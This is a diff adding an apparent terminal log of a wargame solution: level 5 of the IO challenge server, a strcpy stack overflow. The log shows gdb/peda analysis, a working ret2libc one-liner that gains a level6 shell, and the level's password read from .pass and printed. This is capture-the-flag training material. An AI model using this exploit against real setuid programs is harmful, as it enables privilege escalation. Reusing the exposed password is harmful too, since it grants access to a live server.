@@ -1,0 +1,167 @@
+mtucx@mtucx-virtual-machine:~$ ssh level5@io.netgarage.org
+ ____ ____ 
+||i |||o || Welcome at IO!
+||__|||__||
+|/__\|/__\| If you have problems connecting please contact us on IRC. (irc.netgarage.org +6697)
+
+level5@io.netgarage.org's password: 
+ ______   _____
+/\__  _\ /\  __`\       Levels are in /levels
+\/_/\ \/ \ \ \/\ \      Passes are in ~/.pass
+   \ \ \  \ \ \ \ \     Readmes in /home/level1
+    \_\ \__\ \ \_\ \
+    /\_____\\ \_____\   Server admin: bla (blapost@gmail.com)
+    \/_____/ \/_____/
+
+        1. No DoS, local or otherwise
+        2. Do not try to connect to remote systems from this box
+        3. Quotas, watch resources usage, max 2 connections per IP
+	4. You are not allowed to reuse any of our content in writeups
+
+					(32 levels)
+
+- some  random commands:
+	gdb> python x=gdb.execute("info registers", False, True); print x
+	ld --verbose
+	pressing f, while running top (not on this box but in general)
+
+- I have made two popular scripts available which extend gdb, there is no
+  need to use them at all.
+  - gdb -x /usr/share/gdbinit
+  - source /usr/local/peda/peda.py
+  - source /usr/share/gef.py
+
+- temporary feature https://io.netgarage.org:8022
+
+- you can leave your ideas and wishes for io, io64, ioarm in /home/wishlist
+
+- There is an io baby ran mainly by DuSu you can escape to it by typing
+  ssh start@iojuly.
+
+notice: ACCESS to this system is PROHIBITED to any and all current and 
+former employees and contractors of MSAB (Micro Systemation). 
+
+
+
+
+level5@io:~$ cd /levels/
+level5@io:/levels$ ls
+beta           level05.c         level09.c     level15.pass          level19       level27
+level01        level06           level10       level16               level19.c     level27.c
+level02        level06_alt       level10.c     level16_alt           level20       level27.pass
+level02_alt    level06_alt.c     level10.pass  level16_alt_alt       level20.asm   level28
+level02_alt.c  level06_alt.pass  level11       level16_alt_alt.c     level20.pass  level28.c
+level02.c      level06.c         level11.c     level16_alt_alt.pass  level21       level29
+level03        level07           level12       level16_alt.c         level22       level29.c
+level03.c      level07_alt       level12.c     level16.c             level23       level30
+level04        level07_alt.c     level12.pass  level16.pass          level23.c     level30.c
+level04_alt    level07.c         level13       level17               level24       level31
+level04_alt.c  level08           level13.c     level17_alt           level25       level31.asm
+level04.c      level08_alt       level14       level17_alt.c         level25.c     level32
+level05        level08_alt.cpp   level14.c     level17.c             level26
+level05_alt    level08.cpp       level15       level18               level26.l
+level05_alt.c  level09           level15.c     level18.c             level26.y
+level5@io:/levels$ cat level05.c 
+#include <stdio.h>
+#include <string.h>
+
+int main(int argc, char **argv) {
+
+	char buf[128];
+
+	if(argc < 2) return 1;
+
+	strcpy(buf, argv[1]);
+
+	printf("%s\n", buf);	
+
+	return 0;
+}
+level5@io:/levels$ ./level05 
+level5@io:/levels$ ./level05 AAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAA
+level5@io:/levels$ gdb -x /usr/share/gdbinit
+gdb$ source /usr/local/peda/peda.py 
+gdb-peda$ clear
+gdb-peda$ file level05
+Reading symbols from level05...done.
+gdb-peda$ pdisas main
+Dump of assembler code for function main:
+   0x080483b4 <+0>:	push   ebp
+   0x080483b5 <+1>:	mov    ebp,esp
+   0x080483b7 <+3>:	sub    esp,0xa8
+   0x080483bd <+9>:	and    esp,0xfffffff0
+   0x080483c0 <+12>:	mov    eax,0x0
+   0x080483c5 <+17>:	sub    esp,eax
+   0x080483c7 <+19>:	cmp    DWORD PTR [ebp+0x8],0x1
+   0x080483cb <+23>:	jg     0x80483d9 <main+37>
+   0x080483cd <+25>:	mov    DWORD PTR [ebp-0x8c],0x1
+   0x080483d7 <+35>:	jmp    0x8048413 <main+95>
+   0x080483d9 <+37>:	mov    eax,DWORD PTR [ebp+0xc]
+   0x080483dc <+40>:	add    eax,0x4
+   0x080483df <+43>:	mov    eax,DWORD PTR [eax]
+   0x080483e1 <+45>:	mov    DWORD PTR [esp+0x4],eax
+   0x080483e5 <+49>:	lea    eax,[ebp-0x88]
+   0x080483eb <+55>:	mov    DWORD PTR [esp],eax
+   0x080483ee <+58>:	call   0x80482d4 <strcpy@plt>
+   0x080483f3 <+63>:	lea    eax,[ebp-0x88]
+   0x080483f9 <+69>:	mov    DWORD PTR [esp+0x4],eax
+   0x080483fd <+73>:	mov    DWORD PTR [esp],0x8048524
+   0x08048404 <+80>:	call   0x80482b4 <printf@plt>
+   0x08048409 <+85>:	mov    DWORD PTR [ebp-0x8c],0x0
+   0x08048413 <+95>:	mov    eax,DWORD PTR [ebp-0x8c]
+   0x08048419 <+101>:	leave  
+   0x0804841a <+102>:	ret    
+End of assembler dump.
+gdb-peda$ pset arg 'cyclic_pattern(200)'
+gdb-peda$ pshow arg
+arg[1]: AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA
+gdb-peda$ r
+Starting program: /levels/level05 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA'
+AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA
+
+Program received signal SIGSEGV, Segmentation fault.
+[----------------------------------registers-----------------------------------]
+EAX: 0x0 
+EBX: 0xb7fca000 --> 0x1a8da8 
+ECX: 0x0 
+EDX: 0xb7fcb878 --> 0x0 
+ESI: 0x0 
+EDI: 0x0 
+EBP: 0x41514141 ('AAQA')
+ESP: 0xbffffbd0 ("RAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
+EIP: 0x41416d41 ('AmAA')
+EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+Invalid $PC address: 0x41416d41
+[------------------------------------stack-------------------------------------]
+0000| 0xbffffbd0 ("RAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
+0004| 0xbffffbd4 ("AASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
+0008| 0xbffffbd8 ("ApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
+0012| 0xbffffbdc ("TAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
+0016| 0xbffffbe0 ("AAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
+0020| 0xbffffbe4 ("ArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
+0024| 0xbffffbe8 ("VAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
+0028| 0xbffffbec ("AAWAAuAAXAAvAAYAAwAAZAAxAAyA")
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x41416d41 in ?? ()
+gdb-peda$ pattern_offset $eip
+1094806849 found at offset: 140
+gdb-peda$ p system
+$2 = {<text variable, no debug info>} 0xb7e5f3e0 <__libc_system>
+gdb-peda$ find '/bin/sh'
+Searching for '/bin/sh' in: None ranges
+Found 1 results, display max 1 items:
+libc : 0xb7f80551 ("/bin/sh")
+gdb-peda$ q
+level5@io:/levels$ ./level05 `python -c 'import struct;print "A"*140+struct.pack("<I",0xb7e5f3e0)+"A"*4+struct.pack("<I",0xb7f80551)'`
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAᴥ·AAAAQ
+sh-4.3$ id
+uid=1005(level5) gid=1005(level5) euid=1006(level6) groups=1005(level5),1029(nosu)
+sh-4.3$ cd /home/`whoami`/
+sh-4.3$ ls -a
+.  ..  .pass  tags  .vimrc
+sh-4.3$ cat .pass
+fQ8W8YlSBJBWKV2R
